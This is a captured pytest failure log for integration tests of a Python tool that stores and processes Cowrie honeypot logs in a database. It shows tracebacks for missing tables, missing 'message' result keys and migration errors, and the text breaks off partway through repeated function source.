2025-10-18 17:39:19,683:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_repair_missing_fields:Column status: session_id=regular, event_type=regular, event_timestamp=regular
2025-10-18 17:39:19,684:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_repair_missing_fields:Using fallback count query due to binary data in JSON payload
2025-10-18 17:39:19,684:ERROR:cowrieprocessor.cli.cowrie_db:cowrie_db.py:_repair_missing_fields:❌ Field backfill failed: (sqlite3.OperationalError) no such table: raw_events
[SQL: 
                        SELECT COUNT(*) as total_missing
                        FROM raw_events
                        WHERE (session_id IS NULL OR event_type IS NULL OR event_timestamp IS NULL)
                          AND payload IS NOT NULL
                    ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:1436 🔧 Starting data repair (dry run)...
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:1487 🔧 Analyzing missing fields...
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:1498 Column status: session_id=regular, event_type=regular, event_timestamp=regular
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:1564 Using fallback count query due to binary data in JSON payload
ERROR    cowrieprocessor.cli.cowrie_db:cowrie_db.py:1801 ❌ Field backfill failed: (sqlite3.OperationalError) no such table: raw_events
[SQL: 
                        SELECT COUNT(*) as total_missing
                        FROM raw_events
                        WHERE (session_id IS NULL OR event_type IS NULL OR event_timestamp IS NULL)
                          AND payload IS NOT NULL
                    ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
__ TestCowrieDatabaseSQLAlchemy2Integration.test_sanitize_unicode_sqlalchemy2 __

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b27665d0>
batch_size = 100, limit = 1000, dry_run = True, progress_callback = None

    def sanitize_unicode_in_database(
        self,
        batch_size: int = 1000,
        limit: Optional[int] = None,
        dry_run: bool = False,
        progress_callback: Optional[Callable[[SanitizationMetrics], None]] = None,
    ) -> Dict[str, Any]:
        """Sanitize Unicode control characters in existing database records.
    
        Args:
            batch_size: Number of records to process in each batch
            limit: Maximum number of records to process (None for all)
            dry_run: If True, only report what would be changed without making changes
            progress_callback: Optional callback function to report progress
    
        Returns:
            Sanitization result with statistics
        """
        result: Dict[str, Any] = {
            'records_processed': 0,
            'records_updated': 0,
            'records_skipped': 0,
            'errors': 0,
            'batches_processed': 0,
            'dry_run': dry_run,
            'message': '',  # Add message field
            'error': '',  # Add error field
        }
    
        try:
            # Check if raw_events table exists
            if not self._table_exists('raw_events'):
>               raise Exception("Raw events table does not exist.")
E               Exception: Raw events table does not exist.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:933: Exception

The above exception was the direct cause of the following exception:

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b44f5a90>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b27665d0>

    def test_sanitize_unicode_sqlalchemy2(self, cowrie_db):
        """Test sanitize_unicode_in_database method with SQLAlchemy 2.0 patterns."""
        # Test with dry run
>       result = cowrie_db.sanitize_unicode_in_database(
            batch_size=100,
            limit=1000,
            dry_run=True
        )

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:149: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b27665d0>
batch_size = 100, limit = 1000, dry_run = True, progress_callback = None

    def sanitize_unicode_in_database(
        self,
        batch_size: int = 1000,
        limit: Optional[int] = None,
        dry_run: bool = False,
        progress_callback: Optional[Callable[[SanitizationMetrics], None]] = None,
    ) -> Dict[str, Any]:
        """Sanitize Unicode control characters in existing database records.
    
        Args:
            batch_size: Number of records to process in each batch
            limit: Maximum number of records to process (None for all)
            dry_run: If True, only report what would be changed without making changes
            progress_callback: Optional callback function to report progress
    
        Returns:
            Sanitization result with statistics
        """
        result: Dict[str, Any] = {
            'records_processed': 0,
            'records_updated': 0,
            'records_skipped': 0,
            'errors': 0,
            'batches_processed': 0,
            'dry_run': dry_run,
            'message': '',  # Add message field
            'error': '',  # Add error field
        }
    
        try:
            # Check if raw_events table exists
            if not self._table_exists('raw_events'):
                raise Exception("Raw events table does not exist.")
    
            dialect_name = get_dialect_name_from_engine(self._get_engine())
    
            logger.info(f"Starting Unicode sanitization (dry_run={dry_run})...")
    
            # Process records in batches
            offset = 0
            while True:
                # Get batch of records to process
                with self._get_engine().connect() as conn:
                    if dialect_name == "postgresql":
                        query = text("""
                            SELECT id, payload::text as payload_text
                            FROM raw_events
                            ORDER BY id ASC
                            LIMIT :batch_size OFFSET :offset
                        """)
                    else:
                        query = text("""
                            SELECT id, payload as payload_text
                            FROM raw_events
                            ORDER BY id ASC
                            LIMIT :batch_size OFFSET :offset
                        """)
    
                    if limit and (offset + batch_size) > limit:
                        query = text(str(query).replace(":batch_size", str(limit - offset)))
    
                    batch_records = conn.execute(query, {"batch_size": batch_size, "offset": offset}).fetchall()
    
                if not batch_records:
                    break
    
                # Process each record in the batch
                records_to_update = []
    
                for record in batch_records:
                    try:
                        record_id = record.id
                        original_payload_text = record.payload_text
    
                        # Check if payload contains problematic Unicode characters
                        if not UnicodeSanitizer.is_safe_for_postgres_json(original_payload_text):
                            # Sanitize the payload
                            sanitized_payload_text = UnicodeSanitizer.sanitize_json_string(original_payload_text)
    
                            # Verify the sanitized payload is valid JSON and safe
                            try:
                                parsed_payload = json.loads(sanitized_payload_text)
                                if UnicodeSanitizer.is_safe_for_postgres_json(sanitized_payload_text):
                                    records_to_update.append(
                                        {
                                            'id': record_id,
                                            'original': original_payload_text,
                                            'sanitized': sanitized_payload_text,
                                            'parsed': parsed_payload,
                                        }
                                    )
                                    result['records_updated'] += 1
                                else:
                                    logger.warning(
                                        f"Record {record_id}: Sanitized payload still not safe for PostgreSQL"
                                    )
                                    result['records_skipped'] += 1
                            except json.JSONDecodeError as e:
                                logger.warning(f"Record {record_id}: Sanitized payload is not valid JSON: {e}")
                                result['records_skipped'] += 1
                        else:
                            result['records_skipped'] += 1
    
                        result['records_processed'] += 1
    
                    except Exception as e:
                        logger.error(f"Error processing record {record.id}: {e}")
                        result['errors'] += 1
                        result['records_processed'] += 1
    
                # Update records in the database (unless dry run)
                if records_to_update and not dry_run:
                    with self._get_engine().begin() as conn:
                        for update_record in records_to_update:
                            try:
                                if dialect_name == "postgresql":
                                    # Update PostgreSQL JSONB column
                                    update_query = text("""
                                        UPDATE raw_events
                                        SET payload = :sanitized_payload::jsonb
                                        WHERE id = :record_id
                                    """)
                                else:
                                    # Update SQLite JSON column
                                    update_query = text("""
                                        UPDATE raw_events
                                        SET payload = :sanitized_payload
                                        WHERE id = :record_id
                                    """)
    
                                conn.execute(
                                    update_query,
                                    {"sanitized_payload": update_record['sanitized'], "record_id": update_record['id']},
                                )
    
                            except Exception as e:
                                logger.error(f"Error updating record {update_record['id']}: {e}")
                                result['errors'] += 1
    
                result['batches_processed'] += 1
                offset += batch_size
    
                # Log progress and emit status
                if result['batches_processed'] % 10 == 0:
                    logger.info(
                        f"Processed {result['records_processed']} records, "
                        f"updated {result['records_updated']}, "
                        f"skipped {result['records_skipped']}, "
                        f"errors {result['errors']}"
                    )
    
                    # Emit progress via callback if provided
                    if progress_callback:
                        metrics = SanitizationMetrics(
                            records_processed=result['records_processed'],
                            records_updated=result['records_updated'],
                            records_skipped=result['records_skipped'],
                            errors=result['errors'],
                            batches_processed=result['batches_processed'],
                            dry_run=dry_run,
                        )
                        progress_callback(metrics)
    
                # Check if we've reached the limit
                if limit and result['records_processed'] >= limit:
                    break
    
            # Final result message
            if dry_run:
                result['message'] = (
                    f"Dry run completed: {result['records_processed']} records analyzed, "
                    f"{result['records_updated']} would be updated, "
                    f"{result['records_skipped']} would be skipped, "
                    f"{result['errors']} errors"
                )
            else:
                result['message'] = (
                    f"Sanitization completed: {result['records_processed']} records processed, "
                    f"{result['records_updated']} updated, "
                    f"{result['records_skipped']} skipped, "
                    f"{result['errors']} errors"
                )
    
        except Exception as e:
            result['error'] = str(e)
            result['message'] = f"Sanitization failed: {e}"
>           raise Exception(f"Sanitization failed: {e}") from e
E           Exception: Sanitization failed: Raw events table does not exist.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:1087: Exception
__ TestCowrieDatabaseSQLAlchemy2Integration.test_longtail_migrate_sqlalchemy2 __

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b46428f0>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b275dc70>

    def test_longtail_migrate_sqlalchemy2(self, cowrie_db):
        """Test longtail_migrate method with SQLAlchemy 2.0 patterns."""
        result = cowrie_db.longtail_migrate(dry_run=True)
    
        assert isinstance(result, dict)
        assert 'success' in result
>       assert 'message' in result
E       AssertionError: assert 'message' in {'current_version': 14, 'dry_run': True, 'migration': 'v9_longtail_analysis', 'success': True}

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:168: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:21,224:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:longtail_migrate:🔄 Longtail migration: v14 -> v9
2025-10-18 17:39:21,225:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:longtail_migrate:🔍 DRY RUN: Would apply longtail migration
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:2140 🔄 Longtail migration: v14 -> v9
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:2143 🔍 DRY RUN: Would apply longtail migration
_ TestCowrieDatabaseSQLAlchemy2Integration.test_longtail_rollback_sqlalchemy2 __

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b4669e50>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2e3aad0>

    def test_longtail_rollback_sqlalchemy2(self, cowrie_db):
        """Test longtail_rollback method with SQLAlchemy 2.0 patterns."""
        result = cowrie_db.longtail_rollback()
    
        assert isinstance(result, dict)
        assert 'success' in result
>       assert 'message' in result
E       AssertionError: assert 'message' in {'new_version': 8, 'rollback_performed': 'v9_to_v8', 'success': True}

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:176: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:21,246:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:longtail_rollback:🔄 Rolling back longtail migration...
2025-10-18 17:39:21,248:INFO:cowrieprocessor.db.migrations:migrations.py:_downgrade_from_v9:Rolling back longtail analysis tables...
2025-10-18 17:39:21,250:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Drop longtail_detections table - 'Engine' object has no attribute 'execute'
2025-10-18 17:39:21,250:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to rollback transaction: 'Engine' object has no attribute 'rollback'
2025-10-18 17:39:21,251:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Drop longtail_analysis table - 'Engine' object has no attribute 'execute'
2025-10-18 17:39:21,251:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to rollback transaction: 'Engine' object has no attribute 'rollback'
2025-10-18 17:39:21,251:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Update schema version to 8 - 'Engine' object has no attribute 'execute'
2025-10-18 17:39:21,251:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to rollback transaction: 'Engine' object has no attribute 'rollback'
2025-10-18 17:39:21,252:INFO:cowrieprocessor.db.migrations:migrations.py:_downgrade_from_v9:Rollback to v8 complete
2025-10-18 17:39:21,252:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:longtail_rollback:✅ Longtail rollback completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:2173 🔄 Rolling back longtail migration...
INFO     cowrieprocessor.db.migrations:migrations.py:1864 Rolling back longtail analysis tables...
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Drop longtail_detections table - 'Engine' object has no attribute 'execute'
ERROR    cowrieprocessor.db.migrations:migrations.py:43 Failed to rollback transaction: 'Engine' object has no attribute 'rollback'
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Drop longtail_analysis table - 'Engine' object has no attribute 'execute'
ERROR    cowrieprocessor.db.migrations:migrations.py:43 Failed to rollback transaction: 'Engine' object has no attribute 'rollback'
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Update schema version to 8 - 'Engine' object has no attribute 'execute'
ERROR    cowrieprocessor.db.migrations:migrations.py:43 Failed to rollback transaction: 'Engine' object has no attribute 'rollback'
INFO     cowrieprocessor.db.migrations:migrations.py:1893 Rollback to v8 complete
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:2181 ✅ Longtail rollback completed successfully
_ TestCowrieDatabaseSQLAlchemy2Integration.test_validate_longtail_schema_sqlalchemy2 _

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b4669f10>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2e3b3d0>

    def test_validate_longtail_schema_sqlalchemy2(self, cowrie_db):
        """Test validate_longtail_schema method with SQLAlchemy 2.0 patterns."""
        result = cowrie_db.validate_longtail_schema()
    
        assert isinstance(result, dict)
        assert 'success' in result
>       assert 'message' in result
E       AssertionError: assert 'message' in {'error': 'Expected schema version 9, got 0', 'success': False}

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:184: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:21,274:INFO:cowrieprocessor.cli.cowrie_db:cowrie_db.py:validate_longtail_schema:🔍 Validating longtail analysis schema...
2025-10-18 17:39:21,310:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.cli.cowrie_db:cowrie_db.py:2197 🔍 Validating longtail analysis schema...
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:146 Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
_ TestCowrieDatabaseSQLAlchemy2Integration.test_backfill_files_table_sqlalchemy2 _

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b28dec80>
batch_size = 100, limit = 1000

    def backfill_files_table(self, batch_size: int = 1000, limit: Optional[int] = None) -> Dict[str, Any]:
        """Backfill files table from historical raw_events data.
    
        Args:
            batch_size: Number of records to process in each batch
            limit: Maximum number of events to process (None for all)
    
        Returns:
            Backfill result with statistics
        """
        result: Dict[str, Any] = {
            'events_processed': 0,
            'files_inserted': 0,
            'errors': 0,
            'batches_processed': 0,
            'message': '',  # Add message field
            'error': '',  # Add error field
        }
    
        try:
            # Check if files table exists
            if not self._table_exists('files'):
>               raise Exception("Files table does not exist. Run 'cowrie-db migrate' first.")
E               Exception: Files table does not exist. Run 'cowrie-db migrate' first.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:668: Exception

The above exception was the direct cause of the following exception:

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b4504b50>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b28dec80>

    def test_backfill_files_table_sqlalchemy2(self, cowrie_db):
        """Test backfill_files_table method with SQLAlchemy 2.0 patterns."""
>       result = cowrie_db.backfill_files_table(batch_size=100, limit=1000)

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:188: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b28dec80>
batch_size = 100, limit = 1000

    def backfill_files_table(self, batch_size: int = 1000, limit: Optional[int] = None) -> Dict[str, Any]:
        """Backfill files table from historical raw_events data.
    
        Args:
            batch_size: Number of records to process in each batch
            limit: Maximum number of events to process (None for all)
    
        Returns:
            Backfill result with statistics
        """
        result: Dict[str, Any] = {
            'events_processed': 0,
            'files_inserted': 0,
            'errors': 0,
            'batches_processed': 0,
            'message': '',  # Add message field
            'error': '',  # Add error field
        }
    
        try:
            # Check if files table exists
            if not self._table_exists('files'):
                raise Exception("Files table does not exist. Run 'cowrie-db migrate' first.")
    
            # Import here to avoid circular imports
            from ..db.json_utils import get_dialect_name_from_engine
            from ..loader.file_processor import create_files_record, extract_file_data
    
            # Get database dialect for query construction
            dialect_name = get_dialect_name_from_engine(self._get_engine())
    
            # Query for file download events using JSON abstraction
            # Handle binary data gracefully by using safer JSON operators and separate connections
            events: list[Any] = []
    
            # Primary query attempt - use a more restrictive approach to avoid binary data
            try:
                with self._get_engine().connect() as conn:
                    if dialect_name == "postgresql":
                        # Use a query that avoids JSON operators that trigger Unicode processing
                        # Instead, use text-based filtering and handle sanitization in Python
                        query = text("""
                            SELECT id, payload::text as payload_text
                            FROM raw_events
                            WHERE payload::text LIKE '%cowrie.session.file_download%'
                              AND payload::text LIKE '%shasum%'
                            ORDER BY id ASC
                        """)
                    else:
                        query = text("""
                            SELECT id, payload as payload_text
                            FROM raw_events
                            WHERE payload LIKE '%cowrie.session.file_download%'
                              AND payload LIKE '%shasum%'
                            ORDER BY id ASC
                        """)
    
                    if limit:
                        query = text(str(query) + f" LIMIT {limit}")
    
                    raw_events = conn.execute(query).fetchall()
    
                    # Process each event to extract valid file download events
                    events = []
    
                    for row in raw_events:
                        try:
                            # Sanitize the payload text before parsing
                            sanitized_payload_text = UnicodeSanitizer.sanitize_json_string(row.payload_text)
                            payload = json.loads(sanitized_payload_text)
    
                            # Check if this is a valid file download event
                            if (
                                payload.get('eventid') == 'cowrie.session.file_download'
                                and payload.get('shasum')
                                and payload.get('shasum') != ''
                                and payload.get('shasum') != 'null'
                            ):
                                events.append(
                                    type('Row', (), {'session_id': payload.get('session'), 'payload': payload})()
                                )
                        except (json.JSONDecodeError, ValueError, AttributeError) as e:
                            logger.debug(f"Skipping invalid JSON payload at id {row.id}: {e}")
                            result['errors'] += 1
                            continue
    
            except Exception as e:
                logger.warning(f"Primary query failed due to binary data: {e}")
    
                # Fallback query attempt - try to get raw data and process it more carefully
                try:
                    logger.info("Attempting fallback query strategy...")
                    with self._get_engine().connect() as conn:
                        if dialect_name == "postgresql":
                            # Get raw payload data as text and process in Python
                            query = text("""
                                SELECT id, payload::text as payload_text
                                FROM raw_events
                                WHERE payload::text LIKE '%cowrie.session.file_download%'
                                ORDER BY id ASC
                            """)
                        else:
                            query = text("""
                                SELECT id, payload as payload_text
                                FROM raw_events
                                WHERE payload LIKE '%cowrie.session.file_download%'
                                ORDER BY id ASC
                            """)
    
                        if limit:
                            query = text(str(query) + f" LIMIT {limit}")
    
                        raw_events = conn.execute(query).fetchall()
    
                        # Process each event with enhanced error handling
                        events = []
    
                        for row in raw_events:
                            try:
                                # Multiple sanitization attempts
                                payload_text = row.payload_text
    
                                # First, try basic Unicode sanitization
                                sanitized = UnicodeSanitizer.sanitize_unicode_string(payload_text, strict=True)
    
                                # Try to parse as JSON
                                try:
                                    payload = json.loads(sanitized)
                                except json.JSONDecodeError:
                                    # Try more aggressive sanitization
                                    sanitized = UnicodeSanitizer.sanitize_json_string(payload_text)
                                    payload = json.loads(sanitized)
    
                                # Check if this is a valid file download event
                                if (
                                    payload.get('eventid') == 'cowrie.session.file_download'
                                    and payload.get('shasum')
                                    and payload.get('shasum') != ''
                                    and payload.get('shasum') != 'null'
                                ):
                                    events.append(
                                        type('Row', (), {'session_id': payload.get('session'), 'payload': payload})()
                                    )
    
                            except Exception as parse_error:
                                logger.debug(f"Skipping corrupted payload at id {row.id}: {parse_error}")
                                result['errors'] += 1
                                continue
    
                except Exception as fallback_error:
                    logger.error(f"Fallback query also failed: {fallback_error}")
                    result['message'] = (
                        "Backfill failed: Unable to process corrupted JSON payloads in raw_events table. "
                        "The data contains Unicode control characters that cannot be processed by PostgreSQL. "
                        "Consider running a data cleanup script or migrating from a clean source."
                    )
                    return result
    
            if not events:
                result['message'] = "No file download events found to backfill"
                return result
    
            # Process events in batches
            batch = []
            for event in events:
                try:
                    # Extract file data (payload is already sanitized and parsed)
                    file_data = extract_file_data(event.payload, event.session_id)
                    if file_data:
                        file_record = create_files_record(file_data)
                        batch.append(file_record)
                        result['events_processed'] += 1
    
                    # Process batch when it reaches batch_size
                    if len(batch) >= batch_size:
                        inserted = self._insert_files_batch(batch)
                        result['files_inserted'] += inserted
                        result['batches_processed'] += 1
                        batch = []
    
                except Exception as e:
                    logger.warning(f"Error processing event: {e}")
                    result['errors'] += 1
    
            # Process remaining batch
            if batch:
                inserted = self._insert_files_batch(batch)
                result['files_inserted'] += inserted
                result['batches_processed'] += 1
    
            result['message'] = (
                f"Backfill completed: {result['files_inserted']} files inserted "
                f"from {result['events_processed']} events"
            )
    
        except Exception as e:
            result['error'] = str(e)
            result['message'] = f"Backfill failed: {e}"
>           raise Exception(f"Backfill failed: {e}") from e
E           Exception: Backfill failed: Files table does not exist. Run 'cowrie-db migrate' first.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:844: Exception
___ TestCowrieDatabaseSQLAlchemy2Integration.test_create_backup_sqlalchemy2 ____

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b4504d60>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2ad63c0>

    def test_create_backup_sqlalchemy2(self, cowrie_db):
        """Test create_backup method with SQLAlchemy 2.0 patterns."""
        result = cowrie_db.create_backup()
    
        assert isinstance(result, str)
>       assert result.endswith('.db')
E       AssertionError: assert False
E        +  where False = <built-in method endswith of str object at 0x7756b2e1ff30>('.db')
E        +    where <built-in method endswith of str object at 0x7756b2e1ff30> = '/tmp/cowrie_backup_20251018_173921.sqlite'.endswith

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:200: AssertionError
_ TestCowrieDatabaseSQLAlchemy2Integration.test_progress_callback_type_safety __

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2959430>
batch_size = 100, limit = 1000, dry_run = True
progress_callback = <function TestCowrieDatabaseSQLAlchemy2Integration.test_progress_callback_type_safety.<locals>.progress_callback at 0x7756b26e5d00>

    def sanitize_unicode_in_database(
        self,
        batch_size: int = 1000,
        limit: Optional[int] = None,
        dry_run: bool = False,
        progress_callback: Optional[Callable[[SanitizationMetrics], None]] = None,
    ) -> Dict[str, Any]:
        """Sanitize Unicode control characters in existing database records.
    
        Args:
            batch_size: Number of records to process in each batch
            limit: Maximum number of records to process (None for all)
            dry_run: If True, only report what would be changed without making changes
            progress_callback: Optional callback function to report progress
    
        Returns:
            Sanitization result with statistics
        """
        result: Dict[str, Any] = {
            'records_processed': 0,
            'records_updated': 0,
            'records_skipped': 0,
            'errors': 0,
            'batches_processed': 0,
            'dry_run': dry_run,
            'message': '',  # Add message field
            'error': '',  # Add error field
        }
    
        try:
            # Check if raw_events table exists
            if not self._table_exists('raw_events'):
>               raise Exception("Raw events table does not exist.")
E               Exception: Raw events table does not exist.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:933: Exception

The above exception was the direct cause of the following exception:

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b44ec370>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2959430>

    def test_progress_callback_type_safety(self, cowrie_db):
        """Test that progress callback has proper type safety."""
        # Test that progress callback can be called with SanitizationMetrics
        callback_called = False
    
        def progress_callback(metrics: SanitizationMetrics) -> None:
            nonlocal callback_called
            callback_called = True
            assert isinstance(metrics, SanitizationMetrics)
            assert isinstance(metrics.records_processed, int)
            assert isinstance(metrics.records_updated, int)
            assert isinstance(metrics.records_skipped, int)
            assert isinstance(metrics.errors, int)
            assert isinstance(metrics.batches_processed, int)
            assert isinstance(metrics.duration_seconds, float)
            assert isinstance(metrics.dry_run, bool)
    
        # Test with progress callback
>       result = cowrie_db.sanitize_unicode_in_database(
            batch_size=100,
            limit=1000,
            dry_run=True,
            progress_callback=progress_callback
        )

/home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:220: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2959430>
batch_size = 100, limit = 1000, dry_run = True
progress_callback = <function TestCowrieDatabaseSQLAlchemy2Integration.test_progress_callback_type_safety.<locals>.progress_callback at 0x7756b26e5d00>

    def sanitize_unicode_in_database(
        self,
        batch_size: int = 1000,
        limit: Optional[int] = None,
        dry_run: bool = False,
        progress_callback: Optional[Callable[[SanitizationMetrics], None]] = None,
    ) -> Dict[str, Any]:
        """Sanitize Unicode control characters in existing database records.
    
        Args:
            batch_size: Number of records to process in each batch
            limit: Maximum number of records to process (None for all)
            dry_run: If True, only report what would be changed without making changes
            progress_callback: Optional callback function to report progress
    
        Returns:
            Sanitization result with statistics
        """
        result: Dict[str, Any] = {
            'records_processed': 0,
            'records_updated': 0,
            'records_skipped': 0,
            'errors': 0,
            'batches_processed': 0,
            'dry_run': dry_run,
            'message': '',  # Add message field
            'error': '',  # Add error field
        }
    
        try:
            # Check if raw_events table exists
            if not self._table_exists('raw_events'):
                raise Exception("Raw events table does not exist.")
    
            dialect_name = get_dialect_name_from_engine(self._get_engine())
    
            logger.info(f"Starting Unicode sanitization (dry_run={dry_run})...")
    
            # Process records in batches
            offset = 0
            while True:
                # Get batch of records to process
                with self._get_engine().connect() as conn:
                    if dialect_name == "postgresql":
                        query = text("""
                            SELECT id, payload::text as payload_text
                            FROM raw_events
                            ORDER BY id ASC
                            LIMIT :batch_size OFFSET :offset
                        """)
                    else:
                        query = text("""
                            SELECT id, payload as payload_text
                            FROM raw_events
                            ORDER BY id ASC
                            LIMIT :batch_size OFFSET :offset
                        """)
    
                    if limit and (offset + batch_size) > limit:
                        query = text(str(query).replace(":batch_size", str(limit - offset)))
    
                    batch_records = conn.execute(query, {"batch_size": batch_size, "offset": offset}).fetchall()
    
                if not batch_records:
                    break
    
                # Process each record in the batch
                records_to_update = []
    
                for record in batch_records:
                    try:
                        record_id = record.id
                        original_payload_text = record.payload_text
    
                        # Check if payload contains problematic Unicode characters
                        if not UnicodeSanitizer.is_safe_for_postgres_json(original_payload_text):
                            # Sanitize the payload
                            sanitized_payload_text = UnicodeSanitizer.sanitize_json_string(original_payload_text)
    
                            # Verify the sanitized payload is valid JSON and safe
                            try:
                                parsed_payload = json.loads(sanitized_payload_text)
                                if UnicodeSanitizer.is_safe_for_postgres_json(sanitized_payload_text):
                                    records_to_update.append(
                                        {
                                            'id': record_id,
                                            'original': original_payload_text,
                                            'sanitized': sanitized_payload_text,
                                            'parsed': parsed_payload,
                                        }
                                    )
                                    result['records_updated'] += 1
                                else:
                                    logger.warning(
                                        f"Record {record_id}: Sanitized payload still not safe for PostgreSQL"
                                    )
                                    result['records_skipped'] += 1
                            except json.JSONDecodeError as e:
                                logger.warning(f"Record {record_id}: Sanitized payload is not valid JSON: {e}")
                                result['records_skipped'] += 1
                        else:
                            result['records_skipped'] += 1
    
                        result['records_processed'] += 1
    
                    except Exception as e:
                        logger.error(f"Error processing record {record.id}: {e}")
                        result['errors'] += 1
                        result['records_processed'] += 1
    
                # Update records in the database (unless dry run)
                if records_to_update and not dry_run:
                    with self._get_engine().begin() as conn:
                        for update_record in records_to_update:
                            try:
                                if dialect_name == "postgresql":
                                    # Update PostgreSQL JSONB column
                                    update_query = text("""
                                        UPDATE raw_events
                                        SET payload = :sanitized_payload::jsonb
                                        WHERE id = :record_id
                                    """)
                                else:
                                    # Update SQLite JSON column
                                    update_query = text("""
                                        UPDATE raw_events
                                        SET payload = :sanitized_payload
                                        WHERE id = :record_id
                                    """)
    
                                conn.execute(
                                    update_query,
                                    {"sanitized_payload": update_record['sanitized'], "record_id": update_record['id']},
                                )
    
                            except Exception as e:
                                logger.error(f"Error updating record {update_record['id']}: {e}")
                                result['errors'] += 1
    
                result['batches_processed'] += 1
                offset += batch_size
    
                # Log progress and emit status
                if result['batches_processed'] % 10 == 0:
                    logger.info(
                        f"Processed {result['records_processed']} records, "
                        f"updated {result['records_updated']}, "
                        f"skipped {result['records_skipped']}, "
                        f"errors {result['errors']}"
                    )
    
                    # Emit progress via callback if provided
                    if progress_callback:
                        metrics = SanitizationMetrics(
                            records_processed=result['records_processed'],
                            records_updated=result['records_updated'],
                            records_skipped=result['records_skipped'],
                            errors=result['errors'],
                            batches_processed=result['batches_processed'],
                            dry_run=dry_run,
